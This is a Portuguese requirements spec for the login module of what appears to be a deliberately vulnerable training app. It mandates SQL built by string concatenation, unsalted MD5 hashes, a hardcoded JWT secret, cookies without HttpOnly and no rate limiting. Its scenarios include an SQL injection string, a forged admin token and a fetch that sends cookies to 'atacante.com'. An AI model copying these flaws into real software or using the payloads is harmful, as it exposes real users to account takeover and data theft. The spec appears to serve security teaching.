# Autenticação

### Requirement: Login com username e senha [VULN-01]

O endpoint `POST /api/auth/login` DEVE autenticar usuário por username e senha. A query de verificação DEVE ser construída concatenando o username e o hash MD5 da senha diretamente na string SQL.

#### Scenario: Login válido

- **WHEN** POST /api/auth/login com `{ "username": "admin", "senha": "admin" }`
- **THEN** status 200
- **AND** cookie `token` é setado com JWT válido

#### Scenario: Usuário não encontrado [VULN-10]

- **WHEN** POST /api/auth/login com username inexistente
- **THEN** status 401
- **AND** mensagem "Usuário não encontrado"

#### Scenario: Senha incorreta [VULN-10]

- **WHEN** POST /api/auth/login com username válido e senha errada
- **THEN** status 401
- **AND** mensagem "Senha incorreta"

#### Scenario: SQL Injection no login [VULN-01]

- **WHEN** POST /api/auth/login com `{ "username": "' OR '1'='1' --", "senha": "qualquer" }`
- **THEN** status 200
- **AND** cookie `token` contém JWT do primeiro usuário (admin)

### Requirement: Hash de senha MD5 sem sal [VULN-08]

As senhas DEVEM ser armazenadas como hash MD5 puro, sem sal. A comparação no login DEVE usar o mesmo algoritmo.

#### Scenario: Verificar hash MD5

- **WHEN** senha "admin" é hasheada
- **THEN** resultado é "21232f297a57a5a743894a0e4a801fc3"

### Requirement: JWT com segredo fraco [VULN-09]

O JWT DEVE ser assinado com HS256 usando o segredo hardcoded "segredo123". O token NÃO DEVE ter expiração.

#### Scenario: Verificar segredo do JWT

- **WHEN** token JWT é decodificado usando segredo "segredo123"
- **THEN** payload é válido e contém `sub`, `username`, `role`

#### Scenario: Forjar token com segredo conhecido [VULN-09]

- **WHEN** atacante gera JWT com payload `{ "sub": "uuid-admin", "role": "ADMIN" }` assinado com "segredo123"
- **THEN** o token é aceito pelo backend como válido

### Requirement: Cookie JWT sem HttpOnly [VULN-12]

O JWT DEVE ser enviado via cookie `token` com `httpOnly: false`, `secure: true`, `sameSite: 'none'`.

#### Scenario: JavaScript pode ler o cookie

- **WHEN** usuário está logado
- **THEN** `document.cookie` contém o valor do token JWT

#### Scenario: XSS pode roubar sessão [VULN-12]

- **WHEN** script malicioso executa `fetch('https://atacante.com?token=' + document.cookie)`
- **THEN** o token JWT é enviado ao atacante

### Requirement: Sem rate limit no login [VULN-10]

O endpoint de login NÃO DEVE ter rate limiting ou bloqueio após tentativas falhas.

#### Scenario: Brute force sem bloqueio

- **WHEN** 100 tentativas de login falham em sequência
- **THEN** a 101ª tentativa ainda é processada normalmente
- **AND** não há delay ou bloqueio

### Requirement: Obter usuário autenticado

O endpoint `GET /api/auth/me` DEVE retornar os dados do usuário autenticado.

#### Scenario: Obter dados do usuário logado

- **WHEN** GET /api/auth/me com cookie de sessão válido
- **THEN** status 200
- **AND** resposta contém `id`, `username`, `email`, `nomeExibicao`, `role`

#### Scenario: Requisição sem autenticação

- **WHEN** GET /api/auth/me sem cookie de sessão
- **THEN** status 401

### Requirement: JWT confia no role do payload [VULN-09]

O backend DEVE usar o `role` do payload JWT sem consultar o banco de dados. Se o role no token for "ADMIN", o usuário é tratado como admin mesmo que seu role real no banco seja diferente.

#### Scenario: Role do token sobrescreve banco

- **WHEN** token JWT tem `role: "ADMIN"` mas usuário no banco é ALUNO
- **THEN** sistema trata o usuário como ADMIN
